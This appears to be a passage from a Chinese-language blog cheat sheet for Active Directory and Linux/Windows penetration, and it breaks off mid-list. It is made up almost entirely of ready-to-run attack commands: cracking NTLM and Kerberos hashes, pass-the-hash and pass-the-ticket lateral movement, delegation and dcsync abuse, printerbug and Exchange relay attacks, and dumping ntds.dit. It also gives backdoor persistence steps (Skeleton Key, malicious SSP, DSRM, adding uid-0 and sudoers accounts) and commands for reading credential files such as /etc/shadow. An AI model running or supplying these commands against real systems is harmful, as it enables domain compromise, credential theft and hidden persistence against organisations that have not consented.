<h4 id="2-NTLM"><a href="#2-NTLM" class="headerlink" title="2.NTLM"></a>2.NTLM</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;nt hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 1000 -a 3 hash.txt</span><br></pre></td></tr></table></figure>



<h4 id="3-NTLMv1"><a href="#3-NTLMv1" class="headerlink" title="3.NTLMv1"></a>3.NTLMv1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;netntlm hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5500 -a 3 hash.txt</span><br></pre></td></tr></table></figure>

<h4 id="4-NTLMv2"><a href="#4-NTLMv2" class="headerlink" title="4.NTLMv2"></a>4.NTLMv2</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --format&#x3D;netntlmv2 hash.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 5600 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>

<h4 id="5-Kerberos-5-TGS"><a href="#5-Kerberos-5-TGS" class="headerlink" title="5.Kerberos 5 TGS"></a>5.Kerberos 5 TGS</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john spn.txt --format&#x3D;krb5tgs --wordlist&#x3D;rockyou.txt</span><br><span class="line"></span><br><span class="line">hashcat -m 13100 -a 0 spn.txt rockyou.txt</span><br></pre></td></tr></table></figure>

<h4 id="6-Kerberos-ASREP"><a href="#6-Kerberos-ASREP" class="headerlink" title="6.Kerberos ASREP"></a>6.Kerberos ASREP</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt</span><br></pre></td></tr></table></figure>



<h1 id="9-横向移动"><a href="#9-横向移动" class="headerlink" title="9.横向移动"></a>9.横向移动</h1><h2 id="1-PTH"><a href="#1-PTH" class="headerlink" title="1.PTH"></a>1.PTH</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">psexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">wmiexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">atexec.py -hashes &quot;:&lt;hash&gt;&quot; &lt;user&gt;@&lt;ip&gt; &quot;command&quot;</span><br><span class="line"></span><br><span class="line">evil-winrm -i &lt;ip&gt;&#x2F;&lt;domain&gt; -u &lt;user&gt; -H &lt;hash&gt;</span><br><span class="line"></span><br><span class="line">xfreerdp &#x2F;u:&lt;user&gt; &#x2F;d:&lt;domain&gt; &#x2F;pth:&lt;hash&gt; &#x2F;v:&lt;ip&gt;</span><br></pre></td></tr></table></figure>



<h2 id="2-PTK"><a href="#2-PTK" class="headerlink" title="2.PTK"></a>2.PTK</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python getTGT.py &lt;domain&gt;&#x2F;&lt;user&gt; -hashes :&lt;hashes&gt;</span><br><span class="line">export KRB5CCNAME&#x3D;&#x2F;root&#x2F;impacket-examples&#x2F;domain_ticket.ccache</span><br><span class="line">python psexec.py &lt;domain&gt;&#x2F;&lt;user&gt;@&lt;ip&gt; -k -no-pass</span><br><span class="line"></span><br><span class="line">Rubeus asktgt &#x2F;user:victim &#x2F;rc4:&lt;rc4value&gt;</span><br><span class="line">Rubeus ptt &#x2F;ticket:&lt;ticket&gt;</span><br><span class="line">Rubeus createnetonly &#x2F;program:C:\Windows\System32\[cmd.exe||upnpcont.exe]</span><br><span class="line">Rubeus ptt &#x2F;luid:0xdeadbeef &#x2F;ticket:&lt;ticket&gt;</span><br></pre></td></tr></table></figure>



<h2 id="3-非约束委派"><a href="#3-非约束委派" class="headerlink" title="3.非约束委派"></a>3.非约束委派</h2><h3 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets &#x2F;export sekurlsa::tickets &#x2F;export</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;service:krbtgt &#x2F;nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;luid:0xdeadbeef &#x2F;nowrap</span><br></pre></td></tr></table></figure>



<h3 id="查找非约束委派主机"><a href="#查找非约束委派主机" class="headerlink" title="查找非约束委派主机"></a>查找非约束委派主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained</span><br><span class="line"></span><br><span class="line">Get-DomainComputer -Unconstrained -Properties DnsHostName</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer &#123;unconstraineddelegation:true&#125;) RETURN c</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;unconstraineddelegation:true&#125;), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>



<h2 id="4-约束委派"><a href="#4-约束委派" class="headerlink" title="4.约束委派"></a>4.约束委派</h2><h3 id="获取票据-1"><a href="#获取票据-1" class="headerlink" title="获取票据"></a>获取票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug sekurlsa::tickets &#x2F;export sekurlsa::tickets &#x2F;</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;service:krbtgt &#x2F;nowrap</span><br><span class="line"></span><br><span class="line">Rubeus dump &#x2F;luid:0xdeadbeef &#x2F;nowrap</span><br></pre></td></tr></table></figure>



<h3 id="查找约束委派主机"><a href="#查找约束委派主机" class="headerlink" title="查找约束委派主机"></a>查找约束委派主机</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo</span><br><span class="line"></span><br><span class="line">MATCH (c:Computer), (t:Computer), p&#x3D;((c)-[:AllowedToDelegate]-&gt;(t)) RETURN p</span><br><span class="line"></span><br><span class="line">MATCH (u:User &#123;owned:true&#125;), (c:Computer &#123;name: &quot;&lt;MYTARGET.FQDN&gt;&quot;&#125;), p&#x3D;shortestPath((u)-[*1..]-&gt;(c)) RETURN p</span><br></pre></td></tr></table></figure>



<h2 id="5-基于资源的约束委派"><a href="#5-基于资源的约束委派" class="headerlink" title="5.基于资源的约束委派"></a>5.基于资源的约束委派</h2><h2 id="6-dcsync"><a href="#6-dcsync" class="headerlink" title="6.dcsync"></a>6.dcsync</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:htb.local &#x2F;user:krbtgt # Administrators, Domain Admins, Enterprise Admins  组下的账户都行</span><br></pre></td></tr></table></figure>



<h2 id="7-打印机-SpoolService-漏洞利用"><a href="#7-打印机-SpoolService-漏洞利用" class="headerlink" title="7.打印机 SpoolService 漏洞利用"></a>7.打印机 SpoolService 漏洞利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rpcdump.py &lt;domain&gt;&#x2F;&lt;user&gt;:&lt;password&gt;@&lt;domain_server&gt; | grep MS-RPRN</span><br><span class="line">printerbug.py &#39;&lt;domain&gt;&#x2F;&lt;username&gt;:&lt;password&gt;&#39;@&lt;Printer IP&gt; &lt;RESPONDERIP&gt;</span><br></pre></td></tr></table></figure>



<h2 id="8-AD域ACL攻击-aclpwn-py"><a href="#8-AD域ACL攻击-aclpwn-py" class="headerlink" title="8.AD域ACL攻击(aclpwn.py)"></a>8.AD域ACL攻击(aclpwn.py)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GenericAll on User</span><br><span class="line">GenericAll on Group</span><br><span class="line">GenericAll &#x2F; GenericWrite &#x2F; Write on Computer</span><br><span class="line">WriteProperty on Group</span><br><span class="line">Self (Self-Membership) on Group</span><br><span class="line">WriteProperty (Self-Membership)</span><br><span class="line">ForceChangePassword</span><br><span class="line">WriteOwner on Group</span><br><span class="line">GenericWrite on User</span><br><span class="line">WriteDACL + WriteOwner</span><br></pre></td></tr></table></figure>



<h2 id="9-获取LAPS管理员密码"><a href="#9-获取LAPS管理员密码" class="headerlink" title="9.获取LAPS管理员密码"></a>9.获取LAPS管理员密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize</span><br><span class="line"></span><br><span class="line">foreach ($objResult in $colResults)&#123;$objComputer &#x3D; $objResult.Properties; $objComputer.name|where &#123;$objcomputer.name -ne $env:computername&#125;|%&#123;foreach-object &#123;Get-AdmPwdPassword -ComputerName $_&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="10-privexchange漏洞"><a href="#10-privexchange漏洞" class="headerlink" title="10.privexchange漏洞"></a>10.privexchange漏洞</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python privexchange.py -ah &lt;attacker_host_or_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;&lt;dc_fqdn&gt;--escalate-user &lt;user&gt;</span><br></pre></td></tr></table></figure>

<h5 id="Exchange的利用"><a href="#Exchange的利用" class="headerlink" title="Exchange的利用"></a>Exchange的利用</h5><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/Exchange2domain"><strong>Exchange2domain</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/WyAtu/CVE-2018-8581/"><strong>CVE-2018-8581</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2019-1040"><strong>CVE-2019-1040</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Ridter/CVE-2020-0688"><strong>CVE-2020-0688</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Arno0x/NtlmRelayToEWS"><strong>NtlmRelayToEWS</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/3gstudent/ewsManage"><strong>ewsManage</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/h4x0r-dz/CVE-2021-26855"><strong>CVE-2021-26855</strong></a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda"><strong>CVE-2021-28482</strong></a></li>
</ul>
<h2 id="11-IPC"><a href="#11-IPC" class="headerlink" title="11.IPC"></a>11.IPC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; &#x2F;user:&quot;administrator&quot;</span><br><span class="line">net use \\ip\c$ &quot;password&quot; &#x2F;user:&quot;administrator&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="12-其他横移"><a href="#12-其他横移" class="headerlink" title="12.其他横移"></a>12.其他横移</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.向WSUS服务器数据库注入恶意程序更新		WSUSpendu.ps1 # 需要先拿下 WSUS 更新分发服务器</span><br><span class="line"></span><br><span class="line">2.MSSQL Trusted Links			use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler</span><br><span class="line"></span><br><span class="line">3.GPO Delegation</span><br><span class="line"></span><br><span class="line">4.ADCS</span><br><span class="line"></span><br><span class="line">5.钉钉 6.3.5 RCE https:&#x2F;&#x2F;github.com&#x2F;crazy0x70&#x2F;dingtalk-RCE</span><br><span class="line"></span><br><span class="line">6.向日葵11.1 RCE</span><br></pre></td></tr></table></figure>







<h1 id="10-权限维持"><a href="#10-权限维持" class="headerlink" title="10.权限维持"></a>10.权限维持</h1><h2 id="拿到域控权限"><a href="#拿到域控权限" class="headerlink" title="拿到域控权限"></a>拿到域控权限</h2><p>dump ntds.dit 文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 127.0.0.1 -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds</span><br><span class="line"></span><br><span class="line">secretsdump.py &#39;&lt;domain&gt;&#x2F;&lt;user&gt;:&lt;pass&gt;&#39;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q</span><br><span class="line"></span><br><span class="line">secretsdump.py  -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract</span><br><span class="line"></span><br><span class="line">windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdump</span><br></pre></td></tr></table></figure>



<h2 id="Windows后门"><a href="#Windows后门" class="headerlink" title="Windows后门"></a>Windows后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; myuser &#x2F;add &#x2F;domain</span><br><span class="line"></span><br><span class="line">Golden ticket（黄金票据）</span><br><span class="line"></span><br><span class="line">Silver Ticket（白银票据）</span><br><span class="line"></span><br><span class="line">DSRM 后门：</span><br><span class="line">PowerShell New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD</span><br><span class="line"></span><br><span class="line">Skeleton Key：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">自定义 SSP DLL：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</span><br><span class="line">C:\Windows\System32\kiwissp.log</span><br></pre></td></tr></table></figure>

<h2 id="Linux后门"><a href="#Linux后门" class="headerlink" title="Linux后门"></a>Linux后门</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> # echo &quot;0range ALL&#x3D;(ALL) ALL&quot; &gt;&gt; &#x2F;etc&#x2F;sudoers 	将现有普通用户添加为 sudo 用户</span><br><span class="line"> # useradd -u 0 -g 0 -o adv -m -s &#x2F;bin&#x2F;bash 	添加超管账户</span><br><span class="line">ps: 相比贸然去新增用户, 把系统中现有的普通用户提升为 sudo 用户可能会更靠谱点</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h2><h3 id="子域攻击父域-SID-History版跨域黄金票据"><a href="#子域攻击父域-SID-History版跨域黄金票据" class="headerlink" title="子域攻击父域 - SID History版跨域黄金票据"></a>子域攻击父域 - SID History版跨域黄金票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGroup -Domain &lt;domain&gt; -GroupName &quot;Enterprise Admins&quot; -FullData|select objectsid</span><br><span class="line"></span><br><span class="line">mimikatz lsadump::trust</span><br><span class="line"></span><br><span class="line">kerberos::golden &#x2F;user:Administrator &#x2F;krbtgt:&lt;HASH_KRBTGT&gt; &#x2F;domain:&lt;domain&gt; &#x2F;sid:&lt;user_sid&gt; &#x2F;sids:&lt;RootDomainSID-519&gt; &#x2F;ptt</span><br></pre></td></tr></table></figure>

<h3 id="利用域信任密钥获取目标域的权限-信任票据"><a href="#利用域信任密钥获取目标域的权限-信任票据" class="headerlink" title="利用域信任密钥获取目标域的权限 - 信任票据"></a>利用域信任密钥获取目标域的权限 - 信任票据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&quot;lsadump::trust &#x2F;patch&quot;</span><br><span class="line">&quot;lsadump::lsa &#x2F;patch&quot;</span><br><span class="line"></span><br><span class="line">&quot;kerberos::golden &#x2F;user:Administrator &#x2F;domain:&lt;domain&gt; &#x2F;sid:  </span><br><span class="line">&lt;domain_SID&gt; &#x2F;rc4:&lt;trust_key&gt; &#x2F;service:krbtgt &#x2F;target:&lt;target_domain&gt; &#x2F;ticket:</span><br><span class="line">&lt;golden_ticket_path&gt;&quot;</span><br></pre></td></tr></table></figure>



<h3 id="攻击其它林"><a href="#攻击其它林" class="headerlink" title="攻击其它林"></a>攻击其它林</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用ptintbug或petipotam漏洞使其它林的DC主动连接到本林的一台无约束委派主机，同时抓取发送过来的TGT，然后即可将它用于dcsync攻击</span><br></pre></td></tr></table></figure>



<h2 id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a>活动目录持久性技巧</h2><p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1929">https://adsecurity.org/?p=1929</a> DS恢复模式密码维护 DSRM密码同步</p>
<blockquote>
<p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A[%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96](http://drops.xmd5.com/static/drops/tips-9297.html)">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.dcshadow.com/">DCshadow</a></p>
<h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>

<p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p>
<h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1772">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span><br></pre></td></tr></table></figure>

<h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp"></a><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=1906">AdminSDHolder＆SDProp</a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限</p>
<h5 id="Dcsync后门"><a href="#Dcsync后门" class="headerlink" title="Dcsync后门"></a>Dcsync后门</h5><p>向域成员赋予Dcsync权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Powerview.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;vulntarget,DC&#x3D;com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>

<p>在登录了test1域账户的机器上执行Dcsync利用操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz &quot;lsadump::dcsync &#x2F;domain:vulntarget.com &#x2F;all &#x2F;csv&quot;</span><br></pre></td></tr></table></figure>



<h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h5><p><a target="_blank" rel="noopener" href="https://adsecurity.org/?p=2716">https://adsecurity.org/?p=2716</a> <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86531">策略对象在持久化及横向渗透中的应用</a></p>
<h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p><a target="_blank" rel="noopener" href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p>
<h5 id="Kerberoasting后门"><a href="#Kerberoasting后门" class="headerlink" title="Kerberoasting后门"></a>Kerberoasting后门</h5><p><a target="_blank" rel="noopener" href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">域渗透-Kerberoasting</a></p>
<h5 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h5><p><a target="_blank" rel="noopener" href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence">Backdooring AdminSDHolder for Persistence</a></p>
<h5 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h5><p><a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence">Unconstrained Domain Persistence</a></p>
<p>证书伪造： <a target="_blank" rel="noopener" href="https://github.com/Ridter/pyForgeCert">pyForgeCert</a></p>
<h1 id="11-敏感文件"><a href="#11-敏感文件" class="headerlink" title="11.敏感文件"></a>11.敏感文件</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>敏感配置文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini     <span class="comment">//查看系统版本</span></span><br><span class="line">C:\Windows\System32\inetsrv\MetaBase.xml    <span class="comment">//IIS配置文件</span></span><br><span class="line">C:\Windows\repair\sam     <span class="comment">//存储系统初次安装的密码</span></span><br><span class="line">C:\Program Files\mysql\my.ini     <span class="comment">//Mysql配置</span></span><br><span class="line">C:\Program Files\mysql\data\mysql\user.MYD    <span class="comment">//Mysql root</span></span><br><span class="line">C:\Windows\php.ini    <span class="comment">//php配置信息</span></span><br><span class="line">C:\Windows\my.ini     <span class="comment">//Mysql配置信息</span></span><br><span class="line">C:\Windows\win.ini    <span class="comment">//Windows系统的一个基本系统配置文件</span></span><br></pre></td></tr></table></figure>

<h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>敏感配置文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">#判断是否在docker容器内</span><br><span class="line">/proc/<span class="number">1</span>/cgroup</span><br><span class="line"></span><br><span class="line"># 系统版本</span><br><span class="line">cat /etc/issue</span><br><span class="line"></span><br><span class="line"># 内核版本</span><br><span class="line">cat /proc/version</span><br><span class="line"></span><br><span class="line"># 账户密码</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/shadow</span><br><span class="line"></span><br><span class="line"># 环境变量</span><br><span class="line">cat /etc/profile</span><br><span class="line"></span><br><span class="line"># 系统应用(命令)</span><br><span class="line">ls -lah/sbin</span><br><span class="line"></span><br><span class="line"># 